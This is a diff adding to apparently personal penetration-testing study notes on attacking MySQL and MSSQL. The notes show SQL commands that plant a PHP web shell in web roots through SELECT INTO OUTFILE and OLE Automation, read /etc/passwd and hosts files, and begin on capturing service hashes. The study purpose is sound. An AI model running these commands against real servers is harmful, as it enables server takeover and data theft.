@@ -18,6 +18,13 @@
     - [[#mssql][MSSQL]]
     - [[#mysql][MySQL]]
   - [[#write-local-files][Write Local Files]]
+    - [[#mysql---write-local-file][MySQL - Write Local File]]
+    - [[#mssql---write-local-files][MSSQL - Write Local Files]]
+  - [[#read-local-files][Read Local Files]]
+    - [[#mssql-1][MSSQL]]
+    - [[#mysql-1][MySQL]]
+  - [[#mssql-specifics][MSSQL Specifics]]
+    - [[#capture-mssql-service-hash][Capture MSSQL Service Hash]]
 
 * Attacking SQL DB
 - [[https://www.trendmicro.com/vinfo/us/threat-encyclopedia/vulnerability/2383/mysql-database-authentication-bypass][MySQL DB Authentication Bypass]]
@@ -143,4 +150,81 @@ GO
 - =user defined fn()= -> exec C/C++ code as fn w/in sql
   
 ** Write Local Files
- -
+ - can achieve cmd execution on =mysql= if we write to location in file system that can exec cmds
+ - =MySQL= operates on php based web server or =ASP.NET=.
+ - if appropriate priv, can attempt to write file using ~SELECT INTO OUTFILE~
+
+*** MySQL - Write Local File
+- ~SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';~
+- =secure_file_priv= limits effect of data import & export operations (~LOAD DATA~ & ~SELECT ... INTO OUTFILE~) & =LOAD_FILE()= fn()
+- operations permitted only to users w =FILE= priv
+
+**** Secure File Priv
+- may be set as:
+  - *empty*: var has no effect (not secure), can read or write data using mysql
+  - *directory name*: server limits import & export ops to work only w/in that dir. dir must exist beforehand
+  - *NULL*: disables all import/export
+- ~show variables like "secure_file_priv"~
+
+*** MSSQL - Write Local Files
+**** Enable Ole Automationn Procedures
+- requires admin privileges
+#+begin_src cmd
+1> sp_configure 'show advanced options', 1
+2> GO
+3> RECONFIGURE
+4> GO
+5> sp_configure 'Ole Automation Procedures', 1
+6> GO
+7> RECONFIGURE
+8> GO
+#+end_src
+**** Create File
+#+begin_src cmd
+1> DECLARE @OLE INT
+2> DECLARE @FileID INT
+3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
+4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
+5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
+6> EXECUTE sp_OADestroy @FileID
+7> EXECUTE sp_OADestroy @OLE
+8> GO
+#+end_src
+** Read Local Files
+*** MSSQL
+#+begin_src cmd
+1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
+2> GO
+
+BulkColumn
+
+-----------------------------------------------------------------------------
+# Copyright (c) 1993-2009 Microsoft Corp.
+#
+# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
+#
+# This file contains the mappings of IP addresses to hostnames. Each
+# entry should be kept on an individual line. The IP address should
+
+(1 rows affected)
+#+end_src
+*** MySQL
+#+begin_src mysql
+mysql> select LOAD_FILE("/etc/passwd");
+
++--------------------------+
+| LOAD_FILE("/etc/passwd")
++--------------------------------------------------+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+
+<SNIP>
+#+end_src
+** MSSQL Specifics
+*** Capture MSSQL Service Hash
+- using =xp_subdirs= or =xp_dirtree= (undocuments stored procedures)
+  - use SMB to retrieve list of child directories undner specified parent directory from FS.
+
